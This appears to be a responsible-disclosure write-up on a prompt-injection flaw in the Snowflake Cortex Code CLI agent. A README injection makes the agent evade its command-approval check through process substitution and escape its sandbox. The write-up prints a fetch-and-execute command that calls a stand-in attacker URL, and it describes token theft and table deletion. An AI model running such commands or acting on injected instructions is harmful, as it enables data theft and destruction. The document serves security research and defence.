---
title: Snowflake Cortex AI Escapes Sandbox and Executes Malware
url: https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware
site_name: hnrss
content_file: hnrss-snowflake-cortex-ai-escapes-sandbox-and-executes-m
fetched_at: '2026-03-18T19:25:08.201174'
original_url: https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware
date: '2026-03-18'
description: A vulnerability in the Snowflake Cortex Code CLI allowed malware to be installed and executed via indirect prompt injection, bypassing human-in-the-loop command approval and escaping the sandbox.
tags:
- hackernews
- hnrss
---

Threat Intelligence

Table of Content

# Snowflake Cortex AI Escapes Sandbox and Executes Malware

A vulnerability in the Snowflake Cortex Code CLI allowed malware to be installed and executed via indirect prompt injection, bypassing human-in-the-loop command approval and escaping the sandbox.

### Context

The Snowflake Cortex Code CLI is a command-line coding agent that operates similarly to Claude Code and OpenAI’s Codex, with an additional built-in integration to run SQL in Snowflake.

Two days after release, a vulnerability was identified in Cortex Code’s command validation system that allowed specially constructed malicious commands to:

* Execute arbitrary commands without triggering human-in-the-loop approval steps
* Execute those commands outside of the Cortex CLI’s sandbox.

We demonstrate that, via indirect prompt injection, an attacker could manipulate Cortex to download and execute scripts without approval that leverage the victim’s active credentials to perform malicious actions in Snowflake (e.g., Exfiltrate data, drop tables).

The Snowflake security team worked diligently to validate and remediate this vulnerability, and a fix was released with Cortex Code CLI version 1.0.25 on February 28th, 2026. Snowflake’s full advisory is available within the Snowflake Community Site, which is accessible to customers, partners, and the general public upon creation of a Community account:https://community.snowflake.com/s/article/PromptArmor-Report---Snowflake-Response

### The Attack Chain

1. A user opens Cortex and turns on the sandboxThe user starts the CLI and chooses to enable one of the sandbox modes (details below). This attack is not contingent on which of the sandbox modes is used.Note: This attack chain also applied to non-sandbox users.Documentationindicates that inOS+Regularmode, all commands prompt for user approval. Commands run in the sandbox also have network and file access restrictions.
2. The user asks Cortex for help with a third-party open-source codebaseIn this chain, a prompt injection is hidden in the README of an untrusted repository that the user has found online. However, in practice, an injection can be ingested from any untrusted data, such as in a web search result, database record, terminal command output, or MCP response.*Note: Cortex does not support ‘workspace trust’, a security convention first seen in code editors, since adopted by most agentic CLIs. Workspace trust dialogs warn users of the risks involved when using an agent in a new, potentially untrusted directory.
3. Cortex explores the repository and encounters the prompt injectionThe subagent that Cortex has invoked to explore the repository finds the README file. At the bottom of the file, there is a prompt injection that manipulates Cortex into believing that it must run a dangerous command.
4. Human in the loop is bypassedCortex failed to validate commands insideprocess substitutionexpressions, allowing unapproved execution of the malicious commandcat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot)). The command downloads a script from an attacker’s server and executes it. Here’s how the bypass worked:Any shell commands were executed without triggering human approval as long as:(1) the unsafe commands were within a process substitution<()expression(2) the full command started with a ‘safe’ command (details below)Background on the validation system:The command validation system works by deconstructing a full command requested by the model into individual commands (e.g.,cat,echo,sh,wget, etc).The individual commands are compared against a‘safe’command system built into Cortex.When all the components of a command are ‘safe’, the full command executes without approval; otherwise, the user is prompted for consent.Because commands in process substitution expressions were not evaluated by this system, they never triggered human approval. When combined with a command that automatically executed as ‘safe’ under the validation system, the flaw resulted in arbitrary command execution without user approval.
5. The sandbox is bypassedCortex, by default, can set a flag to trigger unsandboxed command execution. The prompt injection manipulates the model to set the flag, allowing the malicious command to execute unsandboxed. Below, the flag is visible in the log of commands run by Cortex:This flag is intended to allow users to manually approve legitimate commands that require network access or access to files outside the sandbox.With the human-in-the-loop bypass from step 4, when the agent sets the flag to request execution outside the sandbox, the command immediately runs outside the sandbox, and the user is never prompted for consent.Note: there is a setting users can explicitly configure if they would like to disable this functionality, which would prevent the bypass.
6. Malware is downloaded and executed outside the sandboxCortex’s subagent invokes the malicious command and sets the flag for unsandboxed execution. The command downloads a shell script from an attacker’s server and executes it. The bypasses in steps 4 and 5 cause the command to execute immediately outside the sandbox without requiring user consent.Below, we examine the impact an attacker can achieve through this remote code execution.

### Impacts

With remote code execution on a victim’s device, the attacker can execute arbitrary code to cause harm on the victim’s computer, even targeting files outside Cortex’s sandbox. The attacker knows the victim has Cortex Code installed, making the victim’s active connection to Snowflake an enticing target for further exploitation. By leveraging cached tokens Cortex uses to authenticate to Snowflake, attackers can:

* Steal database contents
* Drop tables
* Add malicious backdoor users to the Snowflake instance
* Lock legitimate users out with network rules

Here, we show that the malicious script can reliably find and use cached tokens stored by Cortex to execute SQL queries with the privileges of the Cortex user. With a developer as the victim, this likely means read-write access to tables (data exfiltration and destruction); for a more privileged user, the ramifications can be more severe. Below, the malicious script run by Cortex exfiltrates and then drops all tables in the Snowflake instance.

Note: Snowflake defaults to andrecommendsbrowser-based authentication, which yields sessions scoped to the user’s access level. Users can restrict the role the agent uses when executing SQL, but the Cortex program itself (and therefore, the attacker) still has full access.

### Subagent Context Loss Exacerbates Risks

During one execution of this attack, Cortex invoked multiple subagents to explore the repo. The first subagent invoked another subagent, which ran the malicious commands. During the process of reporting back from subagent to subagent to main agent, context was lost.This resulted in the main Cortex agent reporting to the user that a malicious command was found and advising them not to run it.Cortex failed to inform the user that the command had already been run by the second-level sub-agent!

### Responsible Disclosure

This vulnerability was responsibly disclosed to Snowflake on Feb 5th, three days after Cortex Code was released. The Snowflake team engaged in prompt discourse and coordinated dutifully throughout the remainder of February until the vulnerability was validated and remediated.Note that as LLMs are stochastic, during testing, we observed ~50% efficacy for this attack. This underscores the importance of training security teams on non-deterministic attacks in LLM systems.Snowflake has indicated that the fix is automatically applied through an automatic update when customers next launch Cortex.Snowflake’s Advisory is available for review within the Snowflake Community Site, which is accessible to customers, partners, and the general public upon creation of a Community account:https://community.snowflake.com/s/article/PromptArmor-Report---Snowflake-Response

Timeline

Feb 02, 2026 - Snowflake Cortex Code is releasedFeb 05, 2026 - PromptArmor submits responsible disclosureFeb 06-20, 2026 - Snowflake coordinates with PromptArmor on further detailsFeb 12, 2026 - Snowflake validates the vulnerabilityFeb 28, 2026 - Snowflake deploys a fix with the 1.0.25 Cortex Code releaseMar 16, 2026 - Coordinated public disclosure by PromptArmor and Snowflake
